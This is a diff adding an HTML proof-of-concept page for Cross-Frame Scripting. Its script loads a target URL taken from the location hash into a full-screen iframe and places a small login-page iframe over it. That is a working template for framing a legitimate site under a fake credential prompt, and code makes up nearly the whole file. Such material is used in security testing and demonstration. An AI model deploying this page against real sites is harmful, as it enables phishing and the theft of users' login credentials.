@@ -1,0 +1,42 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>PoC - Cross-Frame Scripting (XFS)</title>
+<script>
+function abrirhashurl() {
+	var ubicacion = window.location.hash;
+	ubicacion = ubicacion.replace("#", "");
+	if (ubicacion != "") {
+		sendtoiFrame(ubicacion);
+	}
+}
+function sendtoiFrame(url) { 
+   	
+	ifrm = document.getElementById("attack_frame"); 
+   	ifrm.setAttribute("src", url); 
+	try {
+		poc = (ifrm.contentDocument || ifrm.contentWindow);
+		if (poc != null){
+			poc = '';
+		}
+	}catch(err){
+		poc='<hr/><b>This Browser raised an error while trying to access the iFrame: <br/>'+err+'</b>';
+	}
+	return poc;
+}
+window.onload = function() {
+	abrirhashurl();
+}
+window.onhashchange = function() {
+	abrirhashurl();
+}
+</script>
+</head>
+<poc>
+<body>
+<iframe id='attack_frame' src="%target%" style="width:100%;height:100%;position:absolute;left:0px;top:0px;right:0px;bottom:0px;"frameborder="0"></iframe>
+<iframe src="%baseurl%/login.html" style="width:250px;height:180px;position:absolute;left:50%;top:50%;margin:-75px 0 0 -135px;"frameborder="0"></iframe>
+</poc>
+</body>
+</html>
